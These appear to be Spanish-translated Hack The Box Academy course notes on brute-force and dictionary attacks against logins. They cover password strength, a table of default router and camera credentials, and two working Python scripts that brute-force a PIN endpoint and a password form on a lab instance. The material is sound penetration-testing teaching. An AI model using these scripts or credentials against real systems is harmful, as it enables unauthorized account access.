---
tags:
  - HTB-Academy
  - Penetration-Tester
---


# Introducción

Claves y contraseñas, el equivalente moderno de cerraduras y combinaciones, aseguran el mundo digital. Pero, ¿qué pasa si alguien intenta todas las combinaciones posibles hasta que encuentre la que abre la puerta? Eso, en esencia, es `brute forcing`.

## ¿Qué es el Forzamiento Bruto?

En ciberseguridad, el forzamiento bruto es un método de prueba y error utilizado para descifrar contraseñas, credenciales de inicio de sesión o claves de cifrado. Implica probar sistemáticamente todas las combinaciones posibles de caracteres hasta que se encuentre la correcta. El proceso se puede comparar con un ladrón que prueba cada llave en un llavero gigante hasta que encuentran el que desbloquea el cofre del tesoro.

El éxito de un ataque de fuerza bruta depende de varios factores, incluyendo:

- El `complexity` de la contraseña o clave. Las contraseñas más largas con una mezcla de letras mayúsculas y minúsculas, números y símbolos son exponencialmente más complejas de descifrar.
- El `computational power` disponible para el atacante. Las computadoras modernas y el hardware especializado pueden probar miles de millones de combinaciones por segundo, reduciendo significativamente el tiempo necesario para un ataque exitoso.
- El `security measures` en su lugar. Los bloqueos de cuentas, CAPTCHA y otras defensas pueden ralentizar o incluso frustrar los intentos de fuerza bruta.

## Cómo Funciona el Forzamiento Bruto

El proceso de fuerza bruta se puede visualizar de la siguiente manera:

![Diagrama de flujo que muestra el proceso: Iniciar, generar combinación, aplicar combinación, comprobar el éxito, el acceso concedido si tiene éxito.](https://academy.hackthebox.com/storage/modules/57/1n.png)

1. `Start`: El atacante inicia el proceso de fuerza bruta, a menudo con la ayuda de un software especializado.
2. `Generate Possible Combination`: El software genera una posible contraseña o combinación de teclas basada en parámetros predefinidos, como conjuntos de caracteres y longitud.
3. `Apply Combination`: La combinación generada se intenta contra el sistema de destino, como un formulario de inicio de sesión o un archivo cifrado.
4. `Check if Successful`: El sistema evalúa la combinación intentada. Si coincide con la contraseña o clave almacenada, se concede acceso. De lo contrario, el proceso continúa.
5. `Access Granted`: El atacante obtiene acceso no autorizado al sistema o a los datos.
6. `End`: El proceso se repite, generando y probando nuevas combinaciones hasta que se encuentra la correcta o el atacante se rinde.

## Tipos de Forzamiento Bruto

El forzamiento bruto no es una entidad monolítica, sino una colección de diversas técnicas, cada una con sus fortalezas, debilidades y casos de uso ideales. Comprender estas variaciones es crucial tanto para los atacantes como para los defensores, ya que permite a los primeros elegir el enfoque más efectivo y a los segundos implementar contramedidas específicas. La siguiente tabla proporciona una visión general comparativa de varios métodos de fuerza bruta:

|Método|Descripción|Ejemplo|Mejor Utilizado Cuando...|
|---|---|---|---|
|`Simple Brute Force`|Intenta sistemáticamente todas las combinaciones posibles de caracteres dentro de un conjunto de caracteres definido y rango de longitud.|Probar todas las combinaciones de letras minúsculas de 'a' a 'z' para contraseñas de longitud 4 a 6.|No hay información previa sobre la contraseña disponible, y los recursos computacionales son abundantes.|
|`Dictionary Attack`|Utiliza una lista precompilada de palabras, frases y contraseñas comunes.|Probar contraseñas de una lista como 'rockyou.txt' contra un formulario de inicio de sesión.|El objetivo probablemente usará una contraseña débil o fácilmente adivinable basada en patrones comunes.|
|`Hybrid Attack`|Combina elementos de fuerza bruta simple y ataques de diccionario, a menudo anexando o anteponiendo caracteres a las palabras del diccionario.|Agregar números o caracteres especiales al final de las palabras de una lista de diccionario.|El objetivo puede usar una versión ligeramente modificada de una contraseña común.|
|`Credential Stuffing`|Aprovecha las credenciales filtradas de un servicio para intentar acceder a otros servicios, suponiendo que los usuarios reutilicen las contraseñas.|Usar una lista de nombres de usuario y contraseñas filtrados de una violación de datos para intentar iniciar sesión en varias cuentas en línea.|Un gran conjunto de credenciales filtradas está disponible, y se sospecha que el objetivo reutiliza contraseñas en múltiples servicios.|
|`Password Spraying`|Intenta un pequeño conjunto de contraseñas de uso común contra una gran cantidad de nombres de usuario.|Probar contraseñas como 'password123' o 'qwerty' contra todos los nombres de usuario en una organización.|Las políticas de bloqueo de cuenta están vigentes, y el atacante tiene como objetivo evitar la detección mediante la difusión de intentos en varias cuentas.|
|`Rainbow Table Attack`|Utiliza tablas precalculadas de hashes de contraseñas para revertir hashes y recuperar contraseñas de texto sin formato rápidamente.|Pre-computación de hashes para todas las contraseñas posibles de una cierta longitud y conjunto de caracteres, luego comparar hashes capturados contra la tabla para encontrar coincidencias.|Se debe descifrar una gran cantidad de hashes de contraseñas, y hay espacio de almacenamiento disponible para las mesas del arco iris.|
|`Reverse Brute Force`|Apunta una sola contraseña contra múltiples nombres de usuario, a menudo utilizados junto con ataques de relleno de credenciales.|Usar una contraseña filtrada de un servicio para intentar iniciar sesión en varias cuentas con diferentes nombres de usuario.|Existe una fuerte sospecha de que una contraseña en particular se está reutilizando en varias cuentas.|
|`Distributed Brute Force`|Distribuye la carga de trabajo de forzamiento bruto a través de múltiples computadoras o dispositivos para acelerar el proceso.|El uso de un grupo de computadoras para realizar un ataque de fuerza bruta aumenta significativamente el número de combinaciones que se pueden probar por segundo.|La contraseña o clave de destino es altamente compleja, y una sola máquina carece del poder computacional para descifrarla dentro de un plazo razonable.|

## El Papel del Forzamiento Bruto en las Pruebas de Penetración

Las pruebas de penetración, o piratería ética, son una medida proactiva de ciberseguridad que simula ataques del mundo real para identificar y abordar vulnerabilidades antes de que los actores maliciosos puedan explotarlas. El forzamiento bruto es una herramienta crucial en este proceso, particularmente cuando se evalúa la resiliencia de los mecanismos de autenticación basados en contraseñas.

Si bien las pruebas de penetración abarcan una variedad de técnicas, el forzamiento bruto a menudo se emplea estratégicamente cuando:

- `Other avenues are exhausted`: Los intentos iniciales de obtener acceso, como explotar vulnerabilidades conocidas o utilizar tácticas de ingeniería social, pueden no tener éxito. En tales escenarios, el forzamiento bruto es una alternativa viable para superar las barreras de contraseña.
- `Password policies are weak`: Si el sistema de destino emplea políticas de contraseñas laxas, aumenta la probabilidad de que los usuarios tengan contraseñas débiles o fácilmente adivinables. El forzamiento bruto puede exponer efectivamente estas vulnerabilidades.
- `Specific accounts are targeted`: En algunos casos, los probadores de penetración pueden centrarse en comprometer cuentas de usuario específicas, como aquellas con privilegios elevados. El forzamiento bruto se puede adaptar para apuntar directamente a estas cuentas.


# Fundamentos de Seguridad de Contraseña

La efectividad de los ataques de fuerza bruta depende de la fuerza de las contraseñas a las que se dirige. Comprender los fundamentos de la seguridad de las contraseñas es crucial para apreciar la importancia de las prácticas de contraseñas sólidas y los desafíos planteados por los ataques de fuerza bruta.

## La Importancia de las Contraseñas Fuertes

Las contraseñas son la primera línea de defensa en la protección de información y sistemas sensibles. Una contraseña segura es una barrera formidable, lo que dificulta significativamente que los atacantes obtengan acceso no autorizado a través del forzamiento bruto u otras técnicas. Cuanto más larga y compleja es una contraseña, más combinaciones tiene que probar un atacante, aumentando exponencialmente el tiempo y los recursos necesarios para un ataque exitoso.

## La Anatomía de una Contraseña Fuerte

El `National Institute of Standards and Technology` (`NIST`) proporciona pautas para crear contraseñas seguras. Estas directrices enfatizan las siguientes características:

- `Length`: Cuanto más larga sea la contraseña, mejor. Apunta a un mínimo de 12 caracteres, pero siempre es preferible más tiempo. El razonamiento es simple: cada carácter adicional en una contraseña aumenta drásticamente el número de combinaciones posibles. Por ejemplo, una contraseña de 6 caracteres que usa solo letras minúsculas tiene 26 ^ 6 (aproximadamente 300 millones) combinaciones posibles. En contraste, una contraseña de 8 caracteres tiene 26^8 (aproximadamente 200 mil millones) combinaciones. Este aumento exponencial de las posibilidades hace que las contraseñas más largas sean significativamente más resistentes a los ataques de fuerza bruta.
    
- `Complexity`: Use letras mayúsculas y minúsculas, números y símbolos. Evite patrones o secuencias rápidamente adivinables. La inclusión de diferentes tipos de caracteres amplía el conjunto de caracteres potenciales para cada posición en la contraseña. Por ejemplo, una contraseña que usa solo letras minúsculas tiene 26 posibilidades por carácter, mientras que una contraseña que usa letras mayúsculas y minúsculas tiene 52 posibilidades por carácter. Esta mayor complejidad hace que sea mucho más difícil para los atacantes predecir o adivinar contraseñas.
    
- `Uniqueness`: No reutilice contraseñas en diferentes cuentas. Cada cuenta debe tener su propia contraseña única y segura. Si una cuenta está comprometida, todas las demás cuentas que usan la misma contraseña también están en riesgo. Al usar contraseñas únicas para cada cuenta, compartimenta el daño potencial de una violación.
    
- `Randomness`: Evite usar palabras del diccionario, información personal o frases comunes. Cuanto más aleatoria sea la contraseña, más difícil será descifrarla. Los atacantes a menudo usan listas de palabras que contienen contraseñas comunes e información personal para acelerar sus intentos de fuerza bruta. Crear una contraseña aleatoria minimiza las posibilidades de ser incluido en dichas listas de palabras.
    

## Debilidades Comunes de Contraseña

A pesar de la importancia de las contraseñas seguras, muchos usuarios aún confían en contraseñas débiles y fácilmente adivinables. Las debilidades comunes incluyen:

- `Short Passwords`: Las contraseñas con menos de ocho caracteres son particularmente vulnerables a los ataques de fuerza bruta, ya que el número de combinaciones posibles es relativamente pequeño.
- `Common Words and Phrases`: El uso de palabras de diccionario, nombres o frases comunes como contraseñas los hace susceptibles a los ataques de diccionario, donde los atacantes prueban una lista predefinida de contraseñas comunes.
- `Personal Information`: La incorporación de información personal como fechas de nacimiento, nombres de mascotas o direcciones en las contraseñas los hace más fáciles de adivinar, especialmente si esta información está disponible públicamente en las redes sociales u otras plataformas en línea.
- `Reusing Passwords`: Usar la misma contraseña en varias cuentas es arriesgado. Si una cuenta está comprometida, todas las demás cuentas que usan la misma contraseña también están en riesgo.
- `Predictable Patterns`: El uso de patrones como "qwerty" o "123456" o sustituciones simples como "p@ssw0rd" hace que las contraseñas sean fáciles de adivinar, ya que estos patrones son bien conocidos por los atacantes.

## Políticas de Contraseña

Las organizaciones a menudo implementan políticas de contraseñas para hacer cumplir el uso de contraseñas seguras. Estas políticas generalmente incluyen requisitos para:

- `Minimum Length`: El número mínimo de caracteres que debe tener una contraseña.
- `Complexity`: Los tipos de caracteres que deben incluirse en una contraseña (por ejemplo, mayúsculas, minúsculas, números, símbolos).
- `Password Expiration`: La frecuencia con la que se deben cambiar las contraseñas.
- `Password History`: El número de contraseñas anteriores que no se pueden reutilizar.

Si bien las políticas de contraseña pueden ayudar a mejorar la seguridad de la contraseña, también pueden provocar la frustración del usuario y la adopción de prácticas de contraseña deficientes, como escribir contraseñas o usar ligeras variaciones de la misma contraseña. Al diseñar políticas de contraseña, es importante equilibrar la seguridad y la usabilidad.

## Los Peligros de las Credenciales Predeterminadas

Un aspecto crítico de la seguridad de la contraseña que a menudo se pasa por alto es el peligro que representa `default passwords`. Estas contraseñas preestablecidas vienen con varios dispositivos, software o servicios en línea. A menudo son simples y fáciles de adivinar, lo que los convierte en un objetivo principal para los atacantes.

Las contraseñas predeterminadas aumentan significativamente la tasa de éxito de los ataques de fuerza bruta. Los atacantes pueden aprovechar las listas de contraseñas predeterminadas comunes, reduciendo drásticamente el espacio de búsqueda y acelerando el proceso de craqueo. En algunos casos, es posible que los atacantes ni siquiera necesiten realizar un ataque de fuerza bruta; pueden probar algunas contraseñas predeterminadas comunes y obtener acceso con un mínimo esfuerzo.

La prevalencia de contraseñas predeterminadas las convierte en una fruta de bajo alcance para los atacantes. Proporcionan un punto de entrada fácil en sistemas y redes, lo que puede conducir a violaciones de datos, acceso no autorizado y otras actividades maliciosas.

|Dispositivo/Fabricante|Nombre de usuario predeterminado|Contraseña Predeterminada|Tipo de Dispositivo|
|---|---|---|---|
|Router Linksys|administrador|administrador|Enrutador Inalámbrico|
|Enrutador D-Link|administrador|administrador|Enrutador Inalámbrico|
|Netgear Router|administrador|contraseña|Enrutador Inalámbrico|
|Enrutador TP-Link|administrador|administrador|Enrutador Inalámbrico|
|Enrutador Cisco|cisco|cisco|Enrutador de Red|
|Asus Router|administrador|administrador|Enrutador Inalámbrico|
|Router Belkin|administrador|contraseña|Enrutador Inalámbrico|
|Router Zyxel|administrador|1234|Enrutador Inalámbrico|
|SmartCam Samsung|administrador|4321|cámara IP|
|DVR Hikvision|administrador|12345|Grabadora de Video Digital (DVR)|
|Cámara IP del eje|raíz|pasar|cámara IP|
|UniFi AP Ubiquiti|ubicuo|ubicuo|Punto de Acceso Inalámbrico|
|Impresora Canon|administrador|administrador|Impresora de Red|
|Termostato Honeywell|administrador|1234|Termostato Inteligente|
|DVR Panasonic|administrador|12345|Grabadora de Video Digital (DVR)|

Estos son solo algunos ejemplos de contraseñas predeterminadas bien conocidas. Los atacantes a menudo compilan listas extensas de dichas contraseñas y las usan en ataques automatizados.

Junto con las contraseñas predeterminadas, los nombres de usuario predeterminados son otra preocupación importante de seguridad. Los fabricantes a menudo envían dispositivos con nombres de usuario preestablecidos, como `admin`, `root`, o `user`. Es posible que haya notado en la tabla anterior cuántos usan nombres de usuario comunes. Estos nombres de usuario son ampliamente conocidos y a menudo publicados en documentación o fácilmente disponibles en línea. SecLists mantiene una lista de nombres de usuario comunes en [top-nombres-shortlist.txt](https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt)

Los nombres de usuario predeterminados son una vulnerabilidad significativa porque dan a los atacantes un punto de partida predecible. En muchos ataques de fuerza bruta, saber el nombre de usuario es la mitad de la batalla. Con el nombre de usuario ya establecido, el atacante solo necesita descifrar la contraseña, y si el dispositivo todavía usa una contraseña predeterminada, el ataque se puede completar con un mínimo esfuerzo.

Incluso cuando se cambian las contraseñas predeterminadas, conservar el nombre de usuario predeterminado aún deja a los sistemas vulnerables a los ataques. Reduzca drásticamente la superficie de ataque, ya que el hacker puede omitir el proceso de adivinar nombres de usuario y centrarse únicamente en la contraseña.

### Fuerza bruta y Seguridad de Contraseña

En un escenario de fuerza bruta, la fuerza de las contraseñas de destino se convierte en el principal obstáculo del atacante. Una contraseña débil es similar a una cerradura endeble en una puerta – fácilmente abierta con un mínimo esfuerzo. Por el contrario, una contraseña segura actúa como una bóveda fortificada, exigiendo significativamente más tiempo y recursos para violar.

Para un pentester, esto se traduce en una comprensión más profunda de la postura de seguridad del objetivo:

- `Evaluating System Vulnerability:`Las políticas de contraseña, o su ausencia, y la probabilidad de que los usuarios empleen contraseñas débiles informan directamente el éxito potencial de un ataque de fuerza bruta.
- `Strategic Tool Selection:`La complejidad de las contraseñas dicta las herramientas y metodologías que implementará un pentester. Un simple ataque de diccionario podría ser suficiente para contraseñas débiles, mientras que se puede requerir un enfoque híbrido más sofisticado para descifrar las más fuertes.
- `Resource Allocation:`El tiempo estimado y la potencia computacional necesarios para un ataque de fuerza bruta están intrínsecamente vinculados a la complejidad de las contraseñas. Este conocimiento es esencial para una planificación efectiva y la gestión de recursos.
- `Exploiting Weak Points:`Las contraseñas predeterminadas son a menudo el talón de Aquiles de un sistema. La capacidad de un pentester para identificar y aprovechar estas credenciales fácilmente adivinables puede proporcionar un punto de entrada rápido en la red de destino.

En esencia, una comprensión profunda de la seguridad de la contraseña es una hoja de ruta para un pentester que navega por las complejidades de un ataque de fuerza bruta. Revela posibles puntos débiles, informa opciones estratégicas y predice el esfuerzo requerido para una violación exitosa. Este conocimiento, sin embargo, es una espada de doble filo. También subraya la importancia crítica de las prácticas de contraseña sólidas para cualquier organización que busque defenderse contra tales ataques, destacando el papel fundamental de cada usuario en la protección de la información confidencial.


# Ataques de Fuerza Bruta

Para comprender realmente el desafío del forzamiento bruto, es esencial comprender las matemáticas subyacentes. La siguiente fórmula determina el número total de combinaciones posibles para una contraseña:

Código: matemáticas

```mathml
Possible Combinations = Character Set Size^Password Length
```

Por ejemplo, una contraseña de 6 caracteres que usa solo letras minúsculas (tamaño de conjunto de caracteres de 26) tiene 26^6 (aproximadamente 300 millones) combinaciones posibles. En contraste, una contraseña de 8 caracteres con el mismo conjunto de caracteres tiene 26^8 (aproximadamente 200 mil millones) combinaciones. Agregar letras mayúsculas, números y símbolos al conjunto de caracteres expande aún más el espacio de búsqueda exponencialmente.

Este crecimiento exponencial en el número de combinaciones resalta la importancia de la longitud y complejidad de la contraseña. Incluso un pequeño aumento en la longitud o la inclusión de tipos de caracteres adicionales puede aumentar drásticamente el tiempo y los recursos necesarios para un ataque exitoso de fuerza bruta.

Consideremos algunos escenarios para ilustrar el impacto de la longitud de la contraseña y el conjunto de caracteres en el espacio de búsqueda:

||Longitud de la Contraseña|Conjunto de Personajes|Posibles Combinaciones|
|---|---|---|---|
|`Short and Simple`|6|Letras minúsculas (a-z)|26^6 = 308,915,776|
|`Longer but Still Simple`|8|Letras minúsculas (a-z)|26^8 = 208,827,064,576|
|`Adding Complexity`|8|Letras minúsculas y mayúsculas (a-z, A-Z)|52^8 = 53,459,728,531,456|
|`Maximum Complexity`|12|Letras, números y símbolos en minúsculas y mayúsculas|94^12 = 475,920,493,781,698,549,504|

Como puede ver, incluso un ligero aumento en la longitud de la contraseña o la inclusión de tipos de caracteres adicionales amplía drásticamente el espacio de búsqueda. Esto aumenta significativamente la cantidad de combinaciones posibles que un atacante debe probar, lo que hace que la fuerza bruta sea cada vez más desafiante y requiera mucho tiempo. Sin embargo, el tiempo que lleva descifrar una contraseña no solo depende del tamaño de la cámara de espacio de búsqueda, sino que también depende de la potencia computacional disponible del atacante.

Cuanto más potente sea el hardware del atacante (por ejemplo, la cantidad de GPU, CPU o recursos informáticos basados en la nube que pueden utilizar), más conjeturas de contraseña pueden hacer por segundo. Si bien una contraseña compleja puede tardar años en hacerse de fuerza bruta con una sola máquina, un atacante sofisticado que utilice una red distribuida de recursos informáticos de alto rendimiento podría reducir ese tiempo drásticamente.

![Gráfico de barras que compara los tiempos de descifrado de contraseñas para computadoras básicas y súper en diferentes complejidades de contraseñas.](https://academy.hackthebox.com/storage/modules/57/powern.png)

El gráfico anterior ilustra una relación exponencial entre la complejidad de la contraseña y el tiempo de craqueo. A medida que la longitud de la contraseña aumenta y el conjunto de caracteres se expande, el número total de combinaciones posibles crece exponencialmente. Esto aumenta significativamente el tiempo requerido para descifrar la contraseña, incluso con poderosos recursos informáticos.

Comparando la computadora básica y la supercomputadora:

- Computadora básica (1 millón de contraseñas/segundo): Adecuada para descifrar contraseñas simples rápidamente, pero se vuelve poco prácticamente lenta para contraseñas complejas. Por ejemplo, descifrar una contraseña de 8 caracteres usando letras y dígitos tomaría aproximadamente 6.92 años.
- Supercomputadora (1 billón de contraseñas/segundo): Reduce drásticamente los tiempos de craqueo para contraseñas más simples. Sin embargo, incluso con este inmenso poder, descifrar contraseñas altamente complejas puede llevar una cantidad de tiempo poco práctica. Por ejemplo, una contraseña de 12 caracteres con todos los caracteres ASCII aún tardaría unos 15000 años en descifrarse.

## Rompiendo el PIN

**Para seguir, inicie el sistema de destino a través de la sección de preguntas en la parte inferior de la página.**

La aplicación de instancia genera un PIN aleatorio de 4 dígitos y expone un punto final (`/pin`) que acepta un PIN como parámetro de consulta. Si el PIN proporcionado coincide con el generado, la aplicación responde con un mensaje de éxito y un indicador. De lo contrario, devuelve un mensaje de error.

Utilizaremos este simple script de demostración de Python para forzar brutamente el `/pin` punto final en la API. Copie y pegue este script de Python a continuación como `pin-solver.py` en tu máquina. Solo necesita modificar las variables IP y puerto para que coincidan con la información de su sistema de destino.

Código: pitón

```python
import requests

ip = "127.0.0.1"  # Change this to your instance IP address
port = 1234       # Change this to your instance port number

# Try every possible 4-digit PIN (from 0000 to 9999)
for pin in range(10000):
    formatted_pin = f"{pin:04d}"  # Convert the number to a 4-digit string (e.g., 7 becomes "0007")
    print(f"Attempted PIN: {formatted_pin}")

    # Send the request to the server
    response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}")

    # Check if the server responds with success and the flag is found
    if response.ok and 'flag' in response.json():  # .ok means status code is 200 (success)
        print(f"Correct PIN found: {formatted_pin}")
        print(f"Flag: {response.json()['flag']}")
        break
```

El script Python itera sistemáticamente todos los PINs posibles de 4 dígitos (0000 a 9999) y envía solicitudes GET al punto final de Flask con cada PIN. Comprueba el código de estado de respuesta y el contenido para identificar el PIN correcto y capturar el indicador asociado.

  Ataques de Fuerza Bruta

```shell-session
vcrdcr@htb[/htb]$ python pin-solver.py

...
Attempted PIN: 4039
Attempted PIN: 4040
Attempted PIN: 4041
Attempted PIN: 4042
Attempted PIN: 4043
Attempted PIN: 4044
Attempted PIN: 4045
Attempted PIN: 4046
Attempted PIN: 4047
Attempted PIN: 4048
Attempted PIN: 4049
Attempted PIN: 4050
Attempted PIN: 4051
Attempted PIN: 4052
Correct PIN found: 4053
Flag: HTB{...}
```

La salida del script mostrará la progresión del ataque de fuerza bruta, mostrando cada intento de PIN y su resultado correspondiente. La salida final revelará el PIN correcto y la bandera capturada, lo que demuestra la finalización exitosa del ataque de fuerza bruta.


# Diccionario Ataques

Si bien es integral, el enfoque de fuerza bruta puede llevar mucho tiempo y requerir muchos recursos, especialmente cuando se trata de contraseñas complejas. Ahí es donde entran los ataques del diccionario.

## El Poder de las Palabras

La efectividad de un ataque de diccionario radica en su capacidad para explotar la tendencia humana de priorizar contraseñas memorables sobre las seguras. A pesar de las advertencias repetidas, muchas personas continúan optando por contraseñas basadas en información fácilmente disponible, como palabras de diccionario, frases comunes, nombres o patrones fácilmente adivinables. Esta previsibilidad los hace vulnerables a los ataques de diccionario, donde los atacantes prueban sistemáticamente una lista predefinida de contraseñas potenciales contra el sistema de destino.

El éxito de un ataque de diccionario depende de la calidad y especificidad de la lista de palabras utilizada. Una lista de palabras bien elaborada adaptada al público o sistema objetivo puede aumentar significativamente la probabilidad de una violación exitosa. Por ejemplo, si el objetivo es un sistema frecuentado por jugadores, una lista de palabras enriquecida con terminología y jerga relacionada con los juegos resultaría más efectiva que un diccionario genérico. Cuanto más de cerca la lista de palabras refleje las posibles opciones de contraseña del objetivo, mayores serán las posibilidades de un ataque exitoso.

En esencia, el concepto de un ataque de diccionario tiene sus raíces en la comprensión de la psicología humana y las prácticas comunes de contraseña. Al aprovechar esta idea, los atacantes pueden descifrar eficientemente las contraseñas que de otro modo podrían requerir un ataque de fuerza bruta poco prácticamente prolongado. En este contexto, el poder de las palabras reside en su capacidad para explotar la previsibilidad humana y comprometer medidas de seguridad sólidas.

## Fuerza Bruta vs. Ataque de Diccionario

La distinción fundamental entre una fuerza bruta y un ataque de diccionario radica en su metodología para generar posibles candidatos a contraseñas:

- `Brute Force`: Un ataque de fuerza bruta pura prueba sistemáticamente _cada combinación posible_ de caracteres dentro de un conjunto y longitud predeterminados. Si bien este enfoque garantiza el éxito eventual con el tiempo suficiente, puede llevar mucho tiempo, particularmente contra contraseñas más largas o complejas.
- `Dictionary Attack`: En marcado contraste, un ataque de diccionario emplea una lista precompilada de palabras y frases, reduciendo drásticamente el espacio de búsqueda. Esta metodología dirigida da como resultado un ataque mucho más eficiente y rápido, especialmente cuando se sospecha que la contraseña de destino es una palabra o frase común.

|Característica|Diccionario Ataque|Ataque de Fuerza Bruta|Explicación|
|---|---|---|---|
|`Efficiency`|Considerablemente más rápido y más eficiente en recursos.|Puede consumir mucho tiempo y requerir muchos recursos.|Los ataques de diccionario aprovechan una lista predefinida, reduciendo significativamente el espacio de búsqueda en comparación con la fuerza bruta.|
|`Targeting`|Altamente adaptable y se puede adaptar a objetivos o sistemas específicos.|Sin capacidad de orientación inherente.|Las listas de palabras pueden incorporar información relevante para el objetivo (por ejemplo, nombre de la empresa, nombres de los empleados), lo que aumenta la tasa de éxito.|
|`Effectiveness`|Excepcionalmente efectivo contra contraseñas débiles o de uso común.|Eficaz contra todas las contraseñas dado suficiente tiempo y recursos.|Si la contraseña de destino está dentro del diccionario, se descubrirá rápidamente. La fuerza bruta, aunque es universalmente aplicable, puede ser poco práctica para contraseñas complejas debido al gran volumen de combinaciones.|
|`Limitations`|Ineficaz contra contraseñas complejas generadas aleatoriamente.|A menudo poco práctico para contraseñas largas o altamente complejas.|Es poco probable que aparezca una contraseña verdaderamente aleatoria en cualquier diccionario, lo que hace que este ataque sea inútil. El número astronómico de combinaciones posibles para contraseñas largas puede hacer que los ataques de fuerza bruta sean inviables.|

Considere un escenario hipotético en el que un atacante se dirige al portal de inicio de sesión de empleados de una empresa. El atacante puede construir una lista de palabras especializada que incorpore lo siguiente:

- Contraseñas débiles de uso común (por ejemplo, "password123", "qwerty")
- El nombre de la empresa y sus variaciones
- Nombres de empleados o departamentos
- Jerga específica de la industria

Al implementar esta lista de palabras específicas en un ataque de diccionario, el atacante eleva significativamente su probabilidad de descifrar con éxito las contraseñas de los empleados en comparación con un esfuerzo de fuerza bruta puramente aleatorio.

## Creación y Utilización de Listas de Palabras

Las listas de palabras se pueden obtener de varias fuentes, incluyendo:

- `Publicly Available Lists`: Internet alberga una gran cantidad de listas de palabras de libre acceso, que abarcan colecciones de contraseñas de uso común, credenciales filtradas de violaciones de datos y otros datos potencialmente valiosos. Repositorios como [Seclistas](https://github.com/danielmiessler/SecLists/tree/master/Passwords) ofrecer varias listas de palabras que atienden a varios escenarios de ataque.
- `Custom-Built Lists`: Los probadores de penetración pueden crear sus listas de palabras aprovechando la información obtenida durante la fase de reconocimiento. Esto puede incluir detalles sobre los intereses del objetivo, pasatiempos, información personal o cualquier otro dato para la creación de contraseñas.
- `Specialized Lists`: Las listas de palabras se pueden refinar aún más para dirigirse a industrias, aplicaciones o incluso empresas individuales específicas. Estas listas especializadas aumentan la probabilidad de éxito al centrarse en las contraseñas que tienen más probabilidades de ser utilizadas dentro de un contexto particular.
- `Pre-existing Lists`: Ciertas herramientas y marcos vienen preempaquetados con listas de palabras de uso común. Por ejemplo, las distribuciones de pruebas de penetración como ParrotSec a menudo incluyen listas de palabras como `rockyou.txt`, una colección masiva de contraseñas filtradas, fácilmente disponibles para su uso.

Aquí hay una tabla de algunas de las listas de palabras más útiles para iniciar sesión de fuerza bruta:

|Lista de palabras|Descripción|Uso Típico|Fuente|
|---|---|---|---|
|`rockyou.txt`|Una popular lista de palabras de contraseñas que contiene millones de contraseñas filtradas de la violación de RockYou.|Comúnmente utilizado para ataques de fuerza bruta de contraseña.|[Conjunto de datos de incumplimiento de RockYou](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt)|
|`top-usernames-shortlist.txt`|Una lista concisa de los nombres de usuario más comunes.|Adecuado para intentos rápidos de nombre de usuario de fuerza bruta.|[Seclistas](https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt)|
|`xato-net-10-million-usernames.txt`|Una lista más extensa de 10 millones de nombres de usuario.|Utilizado para el forcejeo bruto de nombre de usuario completo.|[Seclistas](https://github.com/danielmiessler/SecLists/blob/master/Usernames/xato-net-10-million-usernames.txt)|
|`2023-200_most_used_passwords.txt`|Una lista de las 200 contraseñas más utilizadas a partir de 2023.|Eficaz para apuntar a contraseñas comúnmente reutilizadas.|[Seclistas](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt)|
|`Default-Credentials/default-passwords.txt`|Una lista de nombres de usuario y contraseñas predeterminados comúnmente utilizados en enrutadores, software y otros dispositivos.|Ideal para probar credenciales predeterminadas.|[Seclistas](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.txt)|

## Lanzar un diccionario al problema

**Para seguir, inicie el sistema de destino a través de la sección de preguntas en la parte inferior de la página.**

La aplicación de instancia crea una ruta (ur/dictionary') que maneja las solicitudes POST. Espera un parámetro 'spassword' en los datos del formulario de la solicitud. Al recibir una solicitud, compara la contraseña enviada con el valor esperado. Si hay una coincidencia, responde con un objeto JSON que contiene un mensaje de éxito y la bandera. De lo contrario, devuelve un mensaje de error con un código de estado 401 (No autorizado).

Copie y pegue este script de Python a continuación como `dictionary-solver.py` en tu máquina. Solo necesita modificar las variables IP y puerto para que coincidan con la información de su sistema de destino.

Código: pitón

```python
import requests

ip = "127.0.0.1"  # Change this to your instance IP address
port = 1234       # Change this to your instance port number

# Download a list of common passwords from the web and split it into lines
passwords = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/500-worst-passwords.txt").text.splitlines()

# Try each password from the list
for password in passwords:
    print(f"Attempted password: {password}")

    # Send a POST request to the server with the password
    response = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password})

    # Check if the server responds with success and contains the 'flag'
    if response.ok and 'flag' in response.json():
        print(f"Correct password found: {password}")
        print(f"Flag: {response.json()['flag']}")
        break
```

El script de Python organiza el ataque del diccionario. Realiza los siguientes pasos:

1. `Downloads the Wordlist`: Primero, el script obtiene una lista de palabras de 500 contraseñas de uso común (y por lo tanto débiles) de SecLists que usan el `requests` biblioteca.
2. `Iterates and Submits Passwords`: Luego itera a través de cada contraseña en la lista de palabras descargada. Para cada contraseña, envía una solicitud POST a la aplicación Flask `/dictionary` punto final, incluida la contraseña en los datos del formulario de la solicitud.
3. `Analyzes Responses`: El script comprueba el código de estado de respuesta después de cada solicitud. Si es 200 (OK), examina más el contenido de la respuesta. Si la respuesta contiene la clave "bandera", significa un inicio de sesión exitoso. El script luego imprime la contraseña descubierta y la bandera capturada.
4. `Continues or Terminates`: Si la respuesta no indica el éxito, el script pasa a la siguiente contraseña en la lista de palabras. Este proceso continúa hasta que se encuentre la contraseña correcta o se agote toda la lista de palabras.

  Diccionario Ataques

```shell-session
vcrdcr@htb[/htb]$ python3 dictionary-solver.py

...
Attempted password: turtle
Attempted password: tiffany
Attempted password: golf
Attempted password: bear
Attempted password: tiger
Correct password found: ...
Flag: HTB{...}
```


# Ataques Híbridos

---

Muchas organizaciones implementan políticas que requieren que los usuarios cambien sus contraseñas periódicamente para mejorar la seguridad. Sin embargo, estas políticas pueden generar inadvertidamente patrones de contraseña predecibles si los usuarios no reciben una educación adecuada sobre la higiene adecuada de la contraseña.

![Diagrama que muestra la contraseña original 'Summer2023' modificada a 'Summer2023!' y 'Summer2024'.](https://academy.hackthebox.com/storage/modules/57/2n.png)

